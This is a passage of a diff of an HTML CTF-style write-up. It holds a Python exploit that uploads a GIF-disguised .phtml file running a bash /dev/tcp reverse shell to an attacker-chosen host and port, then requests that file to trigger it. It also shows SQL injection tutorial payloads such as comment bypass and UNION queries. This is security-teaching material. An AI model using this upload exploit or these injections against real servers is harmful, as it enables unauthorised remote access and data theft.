+    <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="s2">&#34;-----------------------------31046105003900160576454225745</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\&#34;</span><span class="s2">fileToUpload</span><span class="se">\&#34;</span><span class="s2">; filename=</span><span class="se">\&#34;</span><span class="s2">{filename}.gif.phtml</span><span class="se">\&#34;\r\n</span><span class="s2">Content-Type: image/gif</span><span class="se">\r\n\r\n</span><span class="s2">GIF89a213213123&lt;?php shell_exec(</span><span class="se">\&#34;</span><span class="s2">/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/&#34;</span><span class="o">+</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span><span class="s2">&#34;/&#34;</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34; 0&gt;&amp;1&#39;</span><span class="se">\&#34;</span><span class="s2">);</span><span class="se">\r\n\r\n</span><span class="s2">-----------------------------31046105003900160576454225745--</span><span class="se">\r\n</span><span class="s2">&#34;</span>
 
-    cookies = {
-    &quot;isHuman&quot; : &quot;1&quot;
-    }
+    <span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s2">&#34;isHuman&#34;</span> <span class="p">:</span> <span class="s2">&#34;1&#34;</span>
+    <span class="p">}</span>
 
-    r = requests.post(url, headers=headers, data=data, verify=False, cookies = cookies)
-    print(r.text)
+    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">cookies</span> <span class="o">=</span> <span class="n">cookies</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
 
-    print (&quot;A shell script should be uploaded. Now we try to execute it&quot;)
-    url = sys.argv[1] + f&quot;/assets/data/usrimg/{filename}.gif.phtml&quot;
-    headers = {&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;, &quot;Accept-Language&quot;: &quot;en-US,en;q=0.5&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;}
-    requests.get(url, headers=headers, verify=False, cookies = cookies)
-</code></pre><blockquote>
+    <span class="k">print</span> <span class="p">(</span><span class="s2">&#34;A shell script should be uploaded. Now we try to execute it&#34;</span><span class="p">)</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="n">f</span><span class="s2">&#34;/assets/data/usrimg/{filename}.gif.phtml&#34;</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="s2">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept&#34;</span><span class="p">:</span> <span class="s2">&#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept-Language&#34;</span><span class="p">:</span> <span class="s2">&#34;en-US,en;q=0.5&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept-Encoding&#34;</span><span class="p">:</span> <span class="s2">&#34;gzip, deflate&#34;</span><span class="p">,</span> <span class="s2">&#34;Connection&#34;</span><span class="p">:</span> <span class="s2">&#34;close&#34;</span><span class="p">,</span> <span class="s2">&#34;Upgrade-Insecure-Requests&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">}</span>
+    <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">cookies</span> <span class="o">=</span> <span class="n">cookies</span><span class="p">)</span>
+</code></pre></div><blockquote>
 <p>Note: Here, the exploit produces random names with an extension <code>.phtml</code></p>
 </blockquote>
 <p>Let&rsquo;s exploit to get a reverse shell ..!</p>
@@ -627,8 +969,8 @@ root@petshop:/dev/shm#
 </code></pre><blockquote>
 <p>This causes the application to make an SQL query to retrieve details.</p>
 </blockquote>
-<pre><code>SELECT * FROM products WHERE category = 'Gifts' AND released = 1
-</code></pre><blockquote>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">SELECT * FROM products WHERE <span class="nv">category</span> <span class="o">=</span> <span class="s1">&#39;Gifts&#39;</span> AND <span class="nv">released</span> <span class="o">=</span> <span class="m">1</span>
+</code></pre></div><blockquote>
 <p>It returns all the details from the database, attacker construct a SQL query like.</p>
 </blockquote>
 <pre><code>https://website.com/items?category=Fruits'--
@@ -660,8 +1002,8 @@ SELECT * FROM users WHERE username = 'admin'--' AND password = ''
 <blockquote>
 <p>If the application is vulnerable to SQL injection, the <code>UNION</code> can used to retrieve data from other tables within the database.</p>
 </blockquote>
-<pre><code>SELECT a, b FROM table1 UNION SELECT c, d FROM table2
-</code></pre><p>You can study more about <strong>UNION attacks</strong> on <a href="https://portswigger.net/web-security/sql-injection/union-attacks">PortSwigger</a></p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">SELECT a, b FROM table1 UNION SELECT c, d FROM table2
+</code></pre></div><p>You can study more about <strong>UNION attacks</strong> on <a href="https://portswigger.net/web-security/sql-injection/union-attacks">PortSwigger</a></p>
 <h4 id="examining-the-database">Examining the database</h4>
 <blockquote>
 <p>When an attacker exploiting SQL injection vulnerability, it is necessary to gather information about the type of database.</p>
